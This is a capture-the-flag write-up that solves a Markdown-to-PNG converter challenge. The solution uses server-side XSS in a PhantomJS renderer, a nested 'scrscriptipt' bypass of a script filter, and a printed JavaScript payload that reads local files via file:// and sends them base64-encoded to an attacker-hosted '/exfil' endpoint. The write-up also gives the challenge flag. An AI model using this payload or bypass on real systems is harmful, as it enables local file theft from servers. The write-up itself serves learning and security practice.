**The credits for creating this challenge go to: ![0xPwny](https://twitter.com/0xpwny)**

# Light recon:
Looking at the response headers `Server: Apache/2.4.18 (Ubuntu)`,  and the source code (which contains a `mstafa.php`) we will assume that we're dealing with PHP web application.

After doing a some light fuzzing, nothing interesting shows up except `flag.php`:  

```sh
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u https://thnbdarija-xxconverters.chals.io/FUZZ -ac -c -v -e .php
[...Snip...]
[Status: 200, Size: 0, Words: 1, Lines: 1]
| URL | https://thnbdarija-xxconverters.chals.io/flag.php
    * FUZZ: flag.php
```

Browsing to it reveals nothing (so we must read it using LFI/RCE/SSTI/XXE ...)

# Markdown to PNG? : 
The form is rather simple, you submit something and it gets written to an image file which is sent back to us:

![image](https://user-images.githubusercontent.com/92731777/163899463-9e99e247-a015-4c20-90c3-3da55acaa11d.png)
![image](https://user-images.githubusercontent.com/92731777/163899634-50fd0257-da8a-4b51-8e6c-8e1ad257950b.png)

Our request/response combo looks like this:

![image](https://user-images.githubusercontent.com/92731777/163899581-1a914fe1-6b05-4663-b6ab-0e3a6d654d7e.png)

Filenames are random, the only possible attack vector is LFI/Command injection (if for example a router takes our input (filename) and looks for it in another directory besides `pics/`/ concatenates it with a command) but i won't go through it for now and i'll assume that the files are processed THEN written inside `pics/` directory.

This kind of converters have been generally vulnerable to the so called "server side" XSS (e.g dynamic pdf generators) where you can basically inject some html/js code that fetches local files, do SSRF etc...

Let's test that out:

![image](https://user-images.githubusercontent.com/92731777/163900258-ac67689b-113f-4c09-aeb5-06550de40919.png)


It wasn't reflected as text this time but as html instead, we got a potential XSS. Let's see if we can run Javascript code:

![image](https://user-images.githubusercontent.com/92731777/163900525-70325620-ab2f-4e62-ab97-f59d0396f4dd.png)


Yes we can, did you noticed that "script" has been stripped out? [spoiler: there's a WAF in action ;) ]

Running Javascript code like this is cumbersome (e.g you have to escape quotes every now and then when writing complex code). So, let's see if we can include remote script:

![image](https://user-images.githubusercontent.com/92731777/163900570-a6771503-178b-48da-b7f0-5459cd3cfcaa.png)

As mentioned, "script" has been stripped by the server, a common bypass for this is nesting one inside another like `scrscriptipt`, which results in the "outer" script to be concatenated.

Aaaaand we got a request: 

![image](https://user-images.githubusercontent.com/92731777/163901661-90286b32-c248-414f-84be-77bf76ef3e57.png)

# Time to stop joking about XSS:
Looking at the `User-Agent` header we can see `PhantomJS/2.1.1` which is a headless browser, after googling for any known vulnerability/PoC we will come across this one: https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/


TL;DR: We make the server load our remote script, which reads local files using `file://` scheme, and sends the base64 encoded file back to us.
	
`innocent.js` content:
```js
function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write('<iframe src="http://<your_webserver>/exfil?data='+b64+'"></iframe>');
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///etc/hosts"); // file to read
oReq.send();
```

Sping up your webserver to host the file and make the target server include it.

![image](https://user-images.githubusercontent.com/92731777/163900753-305c7a72-d703-4903-81e4-ad9d11ff1fc8.png)

aaand we got a hit with the file being sent back to us:

![image](https://user-images.githubusercontent.com/92731777/163901852-c38fb581-ca2b-476f-a594-7837ba2949ee.png)

`/etc/hosts` file content: 

![image](https://user-images.githubusercontent.com/92731777/163900719-5ed911a2-7932-42a3-ab44-547b054fec59.png)

Local file read confirmed.
Remember that `/flag.php` file? by default apache hosts files under `/var/www/html/`, let's check if it's there

Same drill, edit the file to read and resend the XSS payload, after getting a hit on your local webserver base64 decode the exfil parameter's content:

![image](https://user-images.githubusercontent.com/92731777/163901826-ae56c7a7-0f96-4650-8bbc-40252d86e1cb.png)

Flag: `thnb{3aaaaw3d_D3rd4k_aAasi_xsser}`



